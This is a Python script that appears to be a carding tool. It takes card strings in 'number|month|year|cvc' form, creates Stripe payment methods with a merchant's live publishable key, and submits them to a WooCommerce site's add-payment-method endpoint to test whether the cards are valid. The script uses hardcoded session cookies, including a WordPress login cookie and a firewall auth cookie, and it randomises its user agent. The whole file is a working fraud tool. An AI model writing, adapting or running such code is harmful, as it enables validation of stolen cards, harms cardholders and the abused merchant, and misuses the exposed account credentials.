import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvp = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    user_agent = UserAgent().random
    
    data = f'type=card&card[number]={n}&card[cvc]={cvp}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IT&payment_user_agent=stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fmarclesser.net&time_on_page=28779&client_attribution_metadata[client_session_id]=f82903ff-abf4-4c12-bdcd-56676284a433&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=d8e89c41-bd77-4d16-9216-d609823c13914c8545&muid=376f420b-e3fc-48de-acf5-63bcdf7835b244a31c&sid=7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543&key=pk_live_51FlhREGarDw2Uq2Hq7QcYtNGVnLE0lDltvQbP0xpHeyLlDAFKolfZi5K1hlTsuJ6O696Geh8O2Vg9IDb0BVQBlnN00kWU4vniy&_stripe_version=2024-06-20'

    response = r.post('https://api.stripe.com/v1/payment_methods',data=data)
    
    try:
        id = response.json()['id']
    except:
        return response.json()
    

    cookies = {
    'wffn_traffic_source': 'https://www.google.com/',
    'wffn_flt': '2025-6-8 00:31:32',
    'wffn_timezone': 'Asia/Rangoon',
    'wffn_is_mobile': 'true',
    'wffn_browser': 'Chrome',
    'wffn_referrer': 'https://www.google.com/',
    'wffn_fl_url': '/donate/',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_first_add': 'fd%3D2025-06-08%2007%3A01%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    '_wpfuuid': '512c43ed-9276-497d-842f-ddc58856e22d',
    'sbjs_current_add': 'fd%3D2025-06-08%2007%3A01%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'hu-consent': '{"consent":true,"consentLevel":1,"consentID":"d6fb7578-47ed-4f8e-acc1-ef52d70e4bc0","categories":{"1":true,"2":false,"3":false,"4":false},"expiry":30,"timestamp":1749367913601,"blocking":{"blocked":8,"allowed":0,"blockedServices":["2","3","9","58","93"],"allowedServices":[]},"lastVersion":1,"bannerConfigVersion":"2.4.0"}',
    '_fbp': 'fb.1.1749367931457.748882617728461705',
    '_gid': 'GA1.2.420698417.1749367933',
    '__stripe_mid': '376f420b-e3fc-48de-acf5-63bcdf7835b244a31c',
    '__stripe_sid': '7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543',
    'wordpress_logged_in_30d768da89e7428ca6fa2345e108320f': 'htetmyathtunn2377%7C1749541032%7CDcuTl7dHg1zFOWFRgn6tU4CV5PN6OcgvL946Er7XOqs%7C2da0f33b7c2c66552499abbf9779732735d1f2458b8454c9433ae5bd9a5877c8',
    '_fk_contact_uid': '5c7ef634052bf246776e7e4cf6bf9503',
    'wfwaf-authcookie-6ec01d327ab4d8539633721077a079ea': '225%7Cother%7Cread%7Cc28dbaa704f068e70328e8e5018937dda02fe14ddac322176622af5a3181cd2d',
    'sbjs_session': 'pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmarclesser.net%2Fmy-account%2Fadd-payment-method%2F',
    '_ga': 'GA1.2.454612520.1749367932',
    '_gat_UA-131004846-1': '1',
    '_ga_SGSFK130B5': 'GS2.1.s1749367931$o1$g1$t1749368314$j59$l0$h0',
}

    headers = {
    'authority': 'marclesser.net',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'wffn_traffic_source=https://www.google.com/; wffn_flt=2025-6-8 00:31:32; wffn_timezone=Asia/Rangoon; wffn_is_mobile=true; wffn_browser=Chrome; wffn_referrer=https://www.google.com/; wffn_fl_url=/donate/; sbjs_migrations=1418474375998%3D1; sbjs_first_add=fd%3D2025-06-08%2007%3A01%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36; _wpfuuid=512c43ed-9276-497d-842f-ddc58856e22d; sbjs_current_add=fd%3D2025-06-08%2007%3A01%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fmarclesser.net%2Fdonate%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; hu-consent={"consent":true,"consentLevel":1,"consentID":"d6fb7578-47ed-4f8e-acc1-ef52d70e4bc0","categories":{"1":true,"2":false,"3":false,"4":false},"expiry":30,"timestamp":1749367913601,"blocking":{"blocked":8,"allowed":0,"blockedServices":["2","3","9","58","93"],"allowedServices":[]},"lastVersion":1,"bannerConfigVersion":"2.4.0"}; _fbp=fb.1.1749367931457.748882617728461705; _gid=GA1.2.420698417.1749367933; __stripe_mid=376f420b-e3fc-48de-acf5-63bcdf7835b244a31c; __stripe_sid=7a7edb4e-931a-4c0b-b363-d35ddef2d5270fb543; wordpress_logged_in_30d768da89e7428ca6fa2345e108320f=htetmyathtunn2377%7C1749541032%7CDcuTl7dHg1zFOWFRgn6tU4CV5PN6OcgvL946Er7XOqs%7C2da0f33b7c2c66552499abbf9779732735d1f2458b8454c9433ae5bd9a5877c8; _fk_contact_uid=5c7ef634052bf246776e7e4cf6bf9503; wfwaf-authcookie-6ec01d327ab4d8539633721077a079ea=225%7Cother%7Cread%7Cc28dbaa704f068e70328e8e5018937dda02fe14ddac322176622af5a3181cd2d; sbjs_session=pgs%3D24%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmarclesser.net%2Fmy-account%2Fadd-payment-method%2F; _ga=GA1.2.454612520.1749367932; _gat_UA-131004846-1=1; _ga_SGSFK130B5=GS2.1.s1749367931$o1$g1$t1749368314$j59$l0$h0',
    'origin': 'https://marclesser.net',
    'referer': 'https://marclesser.net/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = {
    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
}

    data = {
    'action': 'create_and_confirm_setup_intent',
    'wc-stripe-payment-method': id,
    'wc-stripe-payment-type': 'card',
    '_ajax_nonce': '1bda1d6670',
}

    responsey = r.post('https://marclesser.net/', params=params, cookies=cookies, headers=headers, data=data)
   # print(responsey.text)
    
    try:
        return responsey.json()
    except:
        return 'pika wikaa chutttt'